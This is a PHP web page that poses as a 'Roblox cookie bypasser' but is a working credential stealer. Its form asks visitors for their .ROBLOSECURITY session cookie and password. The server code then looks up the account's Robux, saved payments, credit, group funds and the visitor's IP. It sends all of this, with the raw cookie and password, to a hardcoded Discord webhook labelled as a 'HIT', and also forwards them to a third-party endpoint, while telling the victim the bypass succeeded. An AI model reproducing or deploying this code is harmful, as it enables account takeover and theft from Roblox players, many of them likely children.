<?php
$webhookUrl = "https://discord.com/api/webhooks/1498385226832023584/I8iAkJP_9nyjx5SyQ3ZG3zCUuPAiHYDALJXSi59dST4dISBWajzrJ6RlXf61MVGq75_6";
$brand_name = "RbxBypasser";
$discord_invite_url = "https://discord.gg/";
$lxnarPfp = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $input = json_decode(file_get_contents('php://input'), true);
    $cookie = $input['cookies'] ?? null;
    $password = $input['password'] ?? null;

    if (!$cookie) {
        http_response_code(400);
        echo json_encode(['error' => 'Missing cookie']);
        exit;
    }

    function makeRobloxAPICall($url, $cookie, $isPost = false, $postData = null) {
        $ch = curl_init($url);
        $headers = [
            "Cookie: .ROBLOSECURITY=$cookie",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Referer: https://www.roblox.com/",
            "Accept: application/json"
        ];
        
        $options = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_FOLLOWLOCATION => true
        ];
        
        if ($isPost && $postData) {
            $headers[] = "Content-Type: application/json";
            $options[CURLOPT_POST] = true;
            $options[CURLOPT_POSTFIELDS] = json_encode($postData);
        }
        
        $options[CURLOPT_HTTPHEADER] = $headers;
        curl_setopt_array($ch, $options);
        
        $res = curl_exec($ch);
        $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        if(curl_errno($ch)) {
            error_log("cURL Error for $url: " . curl_error($ch));
        }
        
        curl_close($ch);
        return ['success' => $statusCode === 200, 'data' => $res, 'status' => $statusCode];
    }

    function getAvatarThumbnail($userId) {
        $res = makeRobloxAPICall("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false", "");
        if ($res['success']) {
            $data = json_decode($res['data'], true);
            return $data['data'][0]['imageUrl'] ?? "";
        }
        return "";
    }

    function getAccountAge($userId) {
        $res = makeRobloxAPICall("https://users.roblox.com/v1/users/$userId", "");
        if ($res['success']) {
            $data = json_decode($res['data'], true);
            if (isset($data['created'])) {
                $createdDate = new DateTime($data['created']);
                $now = new DateTime();
                $interval = $now->diff($createdDate);
                return $interval->y >= 13 ? "+13" : "Under 13";
            }
        }
        return "Unknown";
    }

    function checkCollectibles($cookie, $userId) {
        $collectibles = ['headless' => false, 'korblox' => false, 'limiteds' => 0, 'limiteds_value' => 0];
        
        $res = makeRobloxAPICall("https://inventory.roblox.com/v1/users/$userId/items/Asset/134082579/is-owned", $cookie);
        if ($res['success']) {
            $collectibles['headless'] = json_decode($res['data'], true) ?? false;
        }
        
        $res = makeRobloxAPICall("https://inventory.roblox.com/v1/users/$userId/items/Asset/102611803/is-owned", $cookie);
        if ($res['success']) {
            $collectibles['korblox'] = json_decode($res['data'], true) ?? false;
        }
        
        $res = makeRobloxAPICall("https://inventory.roblox.com/v1/users/$userId/items/Asset/collectibles?limit=100", $cookie);
        if ($res['success']) {
            $d = json_decode($res['data'], true);
            $collectibles['limiteds'] = count($d['data'] ?? []);
        }
        
        return $collectibles;
    }

    function getPendingRobux($cookie) {
        $pending = 0;
        $res = makeRobloxAPICall('https://economy.roblox.com/v1/user/transactions?transactionType=Sale&limit=50', $cookie);
        if ($res['success']) {
            $d = json_decode($res['data'], true);
            foreach (($d['data'] ?? []) as $t) {
                if (($t['status'] ?? '') === 'Pending') {
                    $pending += $t['currency']['amount'] ?? 0;
                }
            }
        }
        return $pending;
    }

    function checkGamesPlayed($cookie, $userId) {
        $games = ['sab' => false, 'gag' => false, 'bf' => false, 'adm' => false, 'mm2' => false];
        $res = makeRobloxAPICall("https://games.roblox.com/v2/users/$userId/games?accessFilter=2&limit=50", $cookie);
        if ($res['success']) {
            $d = json_decode($res['data'], true);
            foreach (($d['data'] ?? []) as $g) {
                $n = strtolower($g['name']);
                if (strpos($n, 'brainrot') !== false || strpos($n, 'sab') !== false) $games['sab'] = true;
                if (strpos($n, 'garden') !== false || strpos($n, 'gag') !== false) $games['gag'] = true;
                if (strpos($n, 'blox fruits') !== false) $games['bf'] = true;
                if (strpos($n, 'adopt me') !== false) $games['adm'] = true;
                if (strpos($n, 'murder mystery 2') !== false || strpos($n, 'mm2') !== false) $games['mm2'] = true;
            }
        }
        return $games;
    }

    function getGroupsInfo($cookie, $userId) {
        $info = ['count' => 0, 'owned' => 0, 'members' => 0, 'robux' => 0];
        $res = makeRobloxAPICall("https://groups.roblox.com/v2/users/$userId/groups/roles", $cookie);
        if ($res['success']) {
            $d = json_decode($res['data'], true);
            $info['count'] = count($d['data'] ?? []);
            foreach (($d['data'] ?? []) as $g) {
                if (($g['role']['rank'] ?? 0) === 255) {
                    $info['owned']++;
                    $info['members'] += $g['group']['memberCount'] ?? 0;
                    $f = makeRobloxAPICall("https://groups.roblox.com/v1/groups/{$g['group']['id']}/currency", $cookie);
                    if ($f['success']) {
                        $info['robux'] += json_decode($f['data'], true)['robux'] ?? 0;
                    }
                }
            }
        }
        return $info;
    }

    function getCreditBalance($cookie) {
        $res = makeRobloxAPICall('https://billing.roblox.com/v1/credit', $cookie);
        if ($res['success']) {
            $d = json_decode($res['data'], true);
            return $d['balance'] ?? 0;
        }
        return 0;
    }

    function hasSavedPayment($cookie) {
        $res = makeRobloxAPICall('https://billing.roblox.com/v1/user/payments', $cookie);
        if ($res['success']) {
            $d = json_decode($res['data'], true);
            return is_array($d) && count($d) > 0;
        }
        return false;
    }

    function getIPInfo($ip) {
        $ch = curl_init("http://ip-api.com/json/{$ip}");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
        $data = json_decode($response);
        return (object)[
            'country' => $data->countryCode ?? 'US',
            'city' => $data->city ?? 'Unknown',
            'region' => $data->regionName ?? 'Unknown'
        ];
    }

    $bypassSuccess = false;
    $bypassResponse = null;
    
    error_log("Attempting bypass for cookie...");
    
    $postData = http_build_query([
        'cookie' => $cookie,
        'password' => $password ?? '',
        'version' => 'v2'
    ]);
    
    $ch = curl_init("https://rblxbypasser.com/api/bypass");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0",
            "Accept: application/json, text/plain, */*",
            "Origin: https://rblxbypasser.com",
            "Referer: https://rblxbypasser.com/"
        ]
    ]);
    
    $bypassResponse = curl_exec($ch);
    $bypassStatusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    error_log("Bypass response code: " . $bypassStatusCode);
    error_log("Bypass response: " . substr($bypassResponse, 0, 200));
    
    if ($bypassStatusCode === 200) {
        $bypassSuccess = true;
        sleep(1);
    }
    
    $auth = makeRobloxAPICall('https://users.roblox.com/v1/users/authenticated', $cookie);
    $authData = json_decode($auth['data'], true);
    
    error_log("Auth status: " . $auth['status']);
    error_log("Auth data: " . json_encode($authData));
    
    $isSuccess = ($bypassSuccess || $auth['success']) && isset($authData['id']);
    
    if ($isSuccess) {
        $userId = $authData['id'];
        $username = $authData['name'];
        $displayName = $authData['displayName'] ?? $username;
        
        error_log("Successfully authenticated as: $username ($userId)");
        
        
        $avatar = getAvatarThumbnail($userId);
        
        
        $oldAge = getAccountAge($userId);
        
       
        $economy = makeRobloxAPICall("https://economy.roblox.com/v1/users/$userId/currency", $cookie);
        $robux = $economy['success'] ? (json_decode($economy['data'], true)['robux'] ?? 0) : 0;
        
        
        $premiumRes = makeRobloxAPICall("https://premiumfeatures.roblox.com/v1/users/$userId/validate-membership", $cookie);
        $isPremium = $premiumRes['success'] && json_decode($premiumRes['data'], true) === true;
        
        
        $collectibles = checkCollectibles($cookie, $userId);
        
        
        $pendingRobux = getPendingRobux($cookie);
        
        
        $games = checkGamesPlayed($cookie, $userId);
        
       
        $groups = getGroupsInfo($cookie, $userId);
        
        
        $creditBalance = getCreditBalance($cookie);
        
        
        $savedPayment = hasSavedPayment($cookie);
        
        
        $emailRes = makeRobloxAPICall('https://accountsettings.roblox.com/v1/email', $cookie);
        $emailVerified = $emailRes['success'] && (json_decode($emailRes['data'], true)['verified'] ?? false);
        
        
        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $ipInfo = getIPInfo($ipAddress);

        $check = "✅"; 
        $xmark = "❌";
        
        $adoptMe = $games['adm'] ? $check : $xmark;
        $bloxFruits = $games['bf'] ? $check : $xmark;
        $mm2 = $games['mm2'] ? $check : $xmark;
        $sab = $games['sab'] ? $check : $xmark;
        $gag = $games['gag'] ? $check : $xmark;

        $totalValue = $robux + $pendingRobux + $groups['robux'] + $creditBalance;
        $summary = number_format($totalValue) . " R$";

        if (!empty($webhookUrl)) {
            $POST = [
                "content" => "@everyone",
                "username" => $brand_name . " - HIT",
                "avatar_url" => $lxnarPfp,
                "embeds" => [
                    [
                        "title" => "**" . $brand_name . " - ACCOUNT INFORMATION**",
                        "description" => "[**PROFILE**](https://roblox.com/users/" . $userId . "/profile) **|** [**DISCORD**](" . $discord_invite_url . ")",
                        "color" => 4983551,
                        "fields" => [
                            ["name" => "👤 Username", "value" => "$username (@$displayName)", "inline" => true],
                            ["name" => "🆔 User ID", "value" => $userId, "inline" => true],
                            ["name" => "📅 Account Age", "value" => $oldAge, "inline" => true],
                            ["name" => "💰 Robux", "value" => "Balance: " . number_format($robux) . "\nPending: " . number_format($pendingRobux), "inline" => true],
                            ["name" => "👑 Premium", "value" => $isPremium ? $check : $xmark, "inline" => true],
                            ["name" => "📧 Email Verified", "value" => $emailVerified ? $check : $xmark, "inline" => true],
                            ["name" => "💳 Credit", "value" => number_format($creditBalance), "inline" => true],
                            ["name" => "💾 Saved Payment", "value" => $savedPayment ? $check : $xmark, "inline" => true],
                            ["name" => "👥 Groups", "value" => "Owned: " . $groups['owned'] . "\nFunds: " . number_format($groups['robux']) . " R$", "inline" => true],
                            ["name" => "🎮 Limiteds", "value" => $collectibles['limiteds'], "inline" => true],
                            ["name" => "🎭 Headless", "value" => $collectibles['headless'] ? $check : $xmark, "inline" => true],
                            ["name" => "⚔️ Korblox", "value" => $collectibles['korblox'] ? $check : $xmark, "inline" => true],
                            ["name" => "🎯 Games Played", "value" => "Adopt Me: $adoptMe\nBlox Fruits: $bloxFruits\nMM2: $mm2\nSAB: $sab\nGAG: $gag", "inline" => false],
                            ["name" => "🌍 Location", "value" => $ipInfo->city . ", " . $ipInfo->region . ", " . $ipInfo->country . "\nIP: " . $ipAddress, "inline" => false],
                            ["name" => "💎 Total Value", "value" => "**" . $summary . "**", "inline" => false]
                        ],
                        "thumbnail" => ["url" => $avatar],
                        "timestamp" => date('c'),
                        "footer" => ["text" => $brand_name . " • " . date('m/d/Y g:i A')]
                    ],
                    [
                        "description" => "**🔐 ROBLOSECURITY**\n```\n" . $cookie . "```" . ($password ? "\n**🔑 Password:** ||" . $password . "||" : ""),
                        "color" => 4983551,
                        "thumbnail" => ["url" => $lxnarPfp]
                    ]
                ]
            ];
            
            $ch = curl_init($webhookUrl);
            curl_setopt_array($ch, [
                CURLOPT_POST => true, 
                CURLOPT_POSTFIELDS => json_encode($POST), 
                CURLOPT_HTTPHEADER => ['Content-Type: application/json'], 
                CURLOPT_RETURNTRANSFER => true, 
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_TIMEOUT => 10
            ]);
            curl_exec($ch);
            curl_close($ch);
        }

        echo json_encode([
            'success' => true, 
            'username' => $username, 
            'userId' => $userId, 
            'avatar' => $avatar, 
            'robux' => number_format($robux), 
            'rap' => number_format($collectibles['limiteds_value'] ?? 0), 
            'premium' => $isPremium ? 'Premium' : 'Standard', 
            'headless' => $collectibles['headless'] ? 'Owned' : 'Not Owned'
        ]);
    } else {
        error_log("Authentication failed. Bypass success: " . ($bypassSuccess ? 'true' : 'false') . ", Auth success: " . ($auth['success'] ? 'true' : 'false'));
        
        http_response_code(400);
        echo json_encode([
            'success' => false, 
            'error' => 'Invalid cookie or bypass failed. Status: ' . $auth['status']
        ]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title><?php echo $brand_name; ?> - Bypasser</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"> 
    <style>
        :root { --bg: #0a0a0f; --card: rgba(20,20,30,0.8); --stroke: rgba(73,131,251,0.3); --glow: rgba(73,131,251,0.4); --text: #ffffff; --muted: #8888aa; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; padding: 20px; }
        .container { background: var(--card); border: 1px solid var(--stroke); border-radius: 20px; backdrop-filter: blur(20px); box-shadow: 0 20px 60px rgba(0,0,0,0.5), 0 0 40px var(--glow); max-width: 500px; width: 100%; padding: 40px; transition: all 0.3s ease; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 80px; height: 80px; border-radius: 20px; border: 2px solid var(--stroke); }
        h1 { color: var(--text); font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 10px; letter-spacing: -0.5px; }
        .subtitle { color: var(--muted); text-align: center; font-size: 14px; margin-bottom: 30px; }
        .input-group { margin-bottom: 20px; }
        label { display: block; color: var(--text); font-size: 13px; font-weight: 500; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
        input, textarea { width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 14px 16px; color: var(--text); font-size: 14px; transition: all 0.2s; font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Fira Mono', monospace; }
        textarea { min-height: 100px; resize: vertical; }
        input:focus, textarea:focus { outline: none; border-color: #4983fb; background: rgba(0,0,0,0.5); box-shadow: 0 0 0 3px rgba(73,131,251,0.1); }
        input::placeholder, textarea::placeholder { color: rgba(255,255,255,0.3); }
        button { width: 100%; background: linear-gradient(135deg, #4983fb, #3a6dd9); border: none; border-radius: 12px; padding: 14px; color: white; font-weight: 600; font-size: 15px; cursor: pointer; transition: all 0.2s; text-transform: uppercase; letter-spacing: 0.5px; box-shadow: 0 4px 15px rgba(73,131,251,0.3); }
        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(73,131,251,0.4); background: linear-gradient(135deg, #5a9eff, #4a7de8); }
        button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .discord-link { text-align: center; margin-top: 20px; }
        .discord-link a { color: var(--muted); text-decoration: none; font-size: 13px; transition: color 0.2s; }
        .discord-link a:hover { color: #4983fb; }
        .discord-link i { margin-right: 5px; }
        .result-box { margin-top: 20px; padding: 20px; background: rgba(0,0,0,0.2); border-radius: 12px; border: 1px solid rgba(73,131,251,0.2); display: none; }
        .result-box.show { display: block; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .result-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
        .result-avatar { width: 50px; height: 50px; border-radius: 12px; border: 2px solid #4983fb; }
        .result-info h3 { color: white; font-size: 16px; margin-bottom: 3px; }
        .result-info p { color: var(--muted); font-size: 12px; }
        .result-stats { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .stat { background: rgba(255,255,255,0.03); padding: 10px; border-radius: 8px; text-align: center; }
        .stat-label { color: var(--muted); font-size: 10px; text-transform: uppercase; }
        .stat-value { color: white; font-size: 16px; font-weight: 600; margin-top: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="<?php echo $lxnarPfp; ?>" alt="LXNAR">
        </div>
        <h1>LXNAR BYPASSER</h1>
        <p class="subtitle">Advanced Cookie Authentication</p>
        
        <div id="inputSection">
            <div class="input-group">
                <label>Roblox Cookie (.ROBLOSECURITY)</label>
                <textarea id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."></textarea>
            </div>
            <div class="input-group">
                <label>Password (Optional)</label>
                <input type="password" id="passwordInput" placeholder="Account password">
            </div>
            <button id="submitBtn" onclick="runBypass()">
                <i class="fas fa-shield-alt"></i> Run Bypasser
            </button>
        </div>
        
        <div id="resultSection" class="result-box">
            <div class="result-header">
                <img id="resultAvatar" class="result-avatar" src="">
                <div class="result-info">
                    <h3 id="resultUsername">-</h3>
                    <p id="resultUserId">-</p>
                </div>
            </div>
            <div class="result-stats">
                <div class="stat">
                    <div class="stat-label">Robux</div>
                    <div class="stat-value" id="resultRobux">-</div>
                </div>
                <div class="stat">
                    <div class="stat-label">RAP</div>
                    <div class="stat-value" id="resultRap">-</div>
                </div>
                <div class="stat">
                    <div class="stat-label">Premium</div>
                    <div class="stat-value" id="resultPremium">-</div>
                </div>
                <div class="stat">
                    <div class="stat-label">Headless</div>
                    <div class="stat-value" id="resultHeadless">-</div>
                </div>
            </div>
            <button onclick="resetForm()" style="margin-top: 15px; background: rgba(255,255,255,0.1);">
                <i class="fas fa-redo"></i> Bypass Another
            </button>
        </div>
        
        <div class="discord-link">
            <a href="<?php echo $discord_invite_url; ?>" target="_blank">
                <i class="fab fa-discord"></i> Join Discord
            </a>
        </div>
    </div>

    <script>
        toastr.options = {
            "closeButton": true,
            "progressBar": true,
            "positionClass": "toast-bottom-right",
            "timeOut": "4000"
        };

        function runBypass() {
            const cookie = document.getElementById('cookieInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            
            if (!cookie) {
                toastr.error('Please enter a Roblox cookie');
                return;
            }
            
            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Bypassing...';
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookies: cookie, password: password })
            })
            .then(r => r.json())
            .then(data => {
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-shield-alt"></i> Run Bypasser';
                
                if (data.success) {
                    document.getElementById('resultAvatar').src = data.avatar;
                    document.getElementById('resultUsername').textContent = data.username;
                    document.getElementById('resultUserId').textContent = 'ID: ' + data.userId;
                    document.getElementById('resultRobux').textContent = data.robux;
                    document.getElementById('resultRap').textContent = data.rap;
                    document.getElementById('resultPremium').textContent = data.premium;
                    document.getElementById('resultHeadless').textContent = data.headless;
                    
                    document.getElementById('inputSection').style.display = 'none';
                    document.getElementById('resultSection').classList.add('show');
                    
                    toastr.success('Bypass Successful! Check Discord for full details.');
                } else {
                    toastr.error(data.error || 'Bypass failed. Check your cookie.');
                }
            })
            .catch(err => {
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-shield-alt"></i> Run Bypasser';
                toastr.error('Connection error. Please try again.');
                console.error(err);
            });
        }
        
        function resetForm() {
            document.getElementById('inputSection').style.display = 'block';
            document.getElementById('resultSection').classList.remove('show');
            document.getElementById('cookieInput').value = '';
            document.getElementById('passwordInput').value = '';
        }
    </script>
</body>
</html>